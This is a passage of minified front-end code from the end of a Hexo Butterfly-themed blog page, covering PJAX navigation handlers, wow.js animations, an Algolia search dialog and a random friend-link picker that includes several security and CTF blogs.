''",window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode"),"object"==typeof disqusjs&&disqusjs.destroy()})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax], .pjax-reload script").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><div class="pjax-reload"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://cdn.jsdelivr.net/gh/graingert/wow@1.3.0/dist/wow.min.js"></script><script defer src="/js/wow_init.js"></script></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div><div class="js-pjax"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script></body></html><script>var flinks=["https://hexo.io/zh-cn/","https://nodejs.org/en/","https://butterfly.js.org/","https://cnhuazhu.top/","https://www.fomal.cc/","https://guole.fun/","https://akilar.top/","https://zykj.js.org/","https://blog.eurkon.com/","https://fe32.top/","https://blog.anheyu.com/","https://meuicat.com/","https://blog.zhheo.com/","https://blog.jyhao.cn/","https://yisous.xyz/","https://blog.justlovesmile.top/","https://uuanqin.top/","https://blog.leonus.cn/","https://aeneag.xyz/","https://blog.xmcve.com/","https://ctf-wiki.org/","https://bestwing.me/","https://houjingyi233.com/","https://paper.seebug.org/","https://security.tencent.com/index.php/blog/","https://xlab.tencent.com/cn/","https://www.ctfiot.com/blog/","https://www.yuque.com/u239977/","https://www.yuque.com/hxfqg9/","https://blog.aabyss.cn/","https://wiki.wgpsec.org/","https://lazzzaro.github.io/","https://zikh26.github.io/","https://bbs.kanxue.com/homepage-949925.htm","https://blog.imzjw.cn/","https://zfe.space/","https://blog.hclonely.com/","https://whb1990.github.io/","https://nickxu.me/","https://benpaodewoniu.github.io/","https://www.antmoe.com/","https://immmmm.com/","https://jinlinxingjian.top/"];function toRandomFlink(){window.open(flinks[Math.floor(Math.random()*flinks.length)])}</script>